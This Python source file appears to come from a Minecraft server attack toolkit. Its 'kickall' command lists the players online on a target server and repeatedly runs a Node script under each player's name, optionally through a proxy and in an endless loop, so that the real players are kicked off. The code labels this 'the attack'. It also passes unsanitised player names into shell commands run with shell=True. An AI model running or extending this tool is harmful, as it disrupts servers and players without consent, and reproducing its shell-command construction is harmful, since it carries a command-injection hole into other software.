#!/usr/bin/python3

import subprocess
import time

from utils.minecraftserver.ServerData import mcstatus
from utils.managers.Settings import SettingsManager
from utils.gets.LoopArgument import get_loop_argument
from utils.gets.Language import language
from utils.color.TextColor import paint
from mcstatus import JavaServer

sm = SettingsManager()
settings = sm.read('settings')


def kickall_command(server, version, loop, proxy=None):
    """
    This command sends a bot with the specified name to 
    try to kick the player.

    :param server: IP address and port of the server
    :param version: Minecraft server version
    :param proxy: In the event that a user has entered a proxy, the bot will connect to the proxy.
    """

    try:
        if mcstatus(server) is None:
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["kickall"]["INVALID_SERVER"]}')
            return
        
        srv = JavaServer.lookup(server)
        response = srv.status()
        players = []

        if response.players.sample is None:
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["kickall"]["NO_PLAYERS"]}')
            return

        for player in response.players.sample:
            players.append(player.name)

        paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["kickall"]["STARTING_THE_ATTACK"]}')
        loop = get_loop_argument(loop)
        server = server.split(':')

        if loop:
            while True:
                time.sleep(2)
                for player in players:
                    if proxy is not None:
                        proxy = proxy.split(':')
                        subprocess.run(f'{settings["NODE_COMMAND"]} utils/scripts/Kick.js {server[0]} {server[1]} {player} {version} {settings["LANGUAGE"]} {proxy[0]} {proxy[1]}', shell=True)

                    else:
                        subprocess.run(f'{settings["NODE_COMMAND"]} utils/scripts/Kick.js {server[0]} {server[1]} {player} {version} {settings["LANGUAGE"]}', shell=True)
            
        else:
            for player in players:
                if proxy is not None:
                    proxy = proxy.split(':')
                    subprocess.run(f'{settings["NODE_COMMAND"]} utils/scripts/Kick.js {server[0]} {server[1]} {player} {version} {settings["LANGUAGE"]} {proxy[0]} {proxy[1]}', shell=True)

                else:
                    subprocess.run(f'{settings["NODE_COMMAND"]} utils/scripts/Kick.js {server[0]} {server[1]} {player} {version} {settings["LANGUAGE"]}', shell=True)

    except KeyboardInterrupt:
        return